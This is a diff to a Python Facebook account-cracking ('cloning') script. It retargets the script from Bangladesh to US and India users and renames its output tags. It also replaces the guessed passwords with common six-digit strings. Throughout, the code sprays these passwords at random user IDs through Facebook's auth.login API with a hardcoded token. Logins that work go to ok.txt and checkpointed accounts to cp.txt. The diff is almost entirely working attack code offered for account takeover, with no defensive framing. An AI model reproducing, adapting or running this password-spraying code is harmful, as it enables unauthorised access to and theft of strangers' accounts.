@@ -261,7 +261,7 @@ def menu():
     print("\t  \033[1;93m[+] Name : "+name)
     print("\033[1;97m--------------------------------------------------")
     print("\033[1;97m[1]\033[1;91m-⋄-\033[1;97mClone Frienlist and Public ID")
-    print("\033[1;97m[2]\033[1;91m-⋄-\033[1;97mClone Bangladesh and India")
+    print("\033[1;97m[2]\033[1;91m-⋄-\033[1;97mClone us yahoo and India")
     print("\033[1;97m[0]\033[1;91m-⋄-\033[1;97mlogout")
     print("\033[1;97m--------------------------------------------------") 
     menu_select()
@@ -450,7 +450,7 @@ def crack2():
 		                                    ok.close()
 		                                    oks.append(uid)
 		                                else:
-		                                    pass5="1999"
+		                                    pass5="223344"
 		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                    d=json.loads(q)
 		                                    if 'www.facebook.com' in d['error_msg']:
@@ -467,7 +467,7 @@ def crack2():
 		                                            ok.close()
 		                                            oks.append(uid)
 		                                        else:
-		                                            pass6="0000"
+		                                            pass6="000000"
 		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                            d=json.loads(q)
 		                                            if 'www.facebook.com' in d['error_msg']:
@@ -484,7 +484,7 @@ def crack2():
 		                                                    ok.close()
 		                                                    oks.append(uid)
 		                                                else:
-		                                                    pass7="5555"
+		                                                    pass7="555555"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                                    d=json.loads(q)
 		                                                    if 'www.facebook.com' in d['error_msg']:
@@ -521,7 +521,7 @@ def bangla_india():
     os.system("python3 .loading.md")
     os.system('clear')
     print logo
-    print("\033[1;97m[1]\033[1;91m-⋄-\033[1;97mRandom Bangladesh Cloning")
+    print("\033[1;97m[1]\033[1;91m-⋄-\033[1;97mRandom US Cloning")
     print("\033[1;97m[2]\033[1;91m-⋄-\033[1;97mRandom India Cloning")
     print("\033[1;97m[0]\033[1;91m-⋄-\033[1;97mBack")	
     print("\033[1;97m--------------------------------------------------")
@@ -553,7 +553,7 @@ def bangla():
 	os.system("python3 .loading.md")
         os.system('clear')
         print logo
-	print("\t   Bangladesh Menu")
+	print("\t     US Menu")
 	print("\033[1;97m--------------------------------------------------")
 	print ("\033[1;97m[1]\033[1;91m-⋄-\033[1;93mCrack From Friend List")
 	print ("\033[1;97m[2]\033[1;91m-⋄-\033[1;93mCrack From Public ID")
@@ -669,7 +669,7 @@ def bangla2():
 		                cps.append(uid)
 		            else:
 		                if 'access_token' in d:
-		                    print("\x1b[1;92m[FIAZ-OK] "+uid+" | "+pass2+" | "+name)
+		                    print("\x1b[1;92m[efk-OK] "+uid+" | "+pass2+" | "+name)
 		                    ok=open("ok.txt","a")
 		                    ok.write(uid+" | "+pass2+"\n")
 		                    ok.close()
@@ -726,7 +726,7 @@ def bangla2():
 		                                            ok.close()
 		                                            oks.append(uid)
 		                                        else:
-		                                            pass6="000"
+		                                            pass6="000000"
 		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                            d=json.loads(q)
 		                                            if 'www.facebook.com' in d['error_msg']:
@@ -915,7 +915,7 @@ def indiaa2():
 		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                    d=json.loads(q)
 		                    if 'www.facebook.com' in d['error_msg']:
-		                        print("\x1b[1;97m[\x1b[1;93mFIAZ-CP\x1b[1;97m]\x1b[1;97m "+uid+"\x1b[1;91m | \x1b[1;97m"+pass3+"\x1b[1;91m | \x1b[1;97m"+name)
+		                        print("\x1b[1;97m[\x1b[1;93mefk-CP\x1b[1;97m]\x1b[1;97m "+uid+"\x1b[1;91m | \x1b[1;97m"+pass3+"\x1b[1;91m | \x1b[1;97m"+name)
 		                        cp=open("cp.txt","a")
 		                        cp.write(uid+" | "+pass3+"\n")
 		                        cp.close()
@@ -945,7 +945,7 @@ def indiaa2():
 		                                    ok.close()
 		                                    oks.append(uid)
 		                                else:
-		                                    pass5="18"
+		                                    pass5="334455"
 		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                    d=json.loads(q)
 		                                    if 'www.facebook.com' in d['error_msg']:
@@ -966,7 +966,7 @@ def indiaa2():
 		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                            d=json.loads(q)
 		                                            if 'www.facebook.com' in d['error_msg']:
-		                                                print("\x1b[1;97m[\x1b[1;93mFIAZ-CP\x1b[1;97m]\x1b[1;97m "+uid+"\x1b[1;91m | \x1b[1;97m"+pass6+"\x1b[1;91m | \x1b[1;97m"+name)
+		                                                print("\x1b[1;97m[\x1b[1;93mefk-CP\x1b[1;97m]\x1b[1;97m "+uid+"\x1b[1;91m | \x1b[1;97m"+pass6+"\x1b[1;91m | \x1b[1;97m"+name)
 		                                                cp=open("cp.txt","a")
 		                                                cp.write(uid+" | "+pass6+"\n")
 		                                                cp.close()
@@ -979,7 +979,7 @@ def indiaa2():
 		                                                    ok.close()
 		                                                    oks.append(uid)
 		                                                else:
-		                                                    pass7="1999"
+		                                                    pass7="786786"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                                    d=json.loads(q)
 		                                                    if 'www.facebook.com' in d['error_msg']:
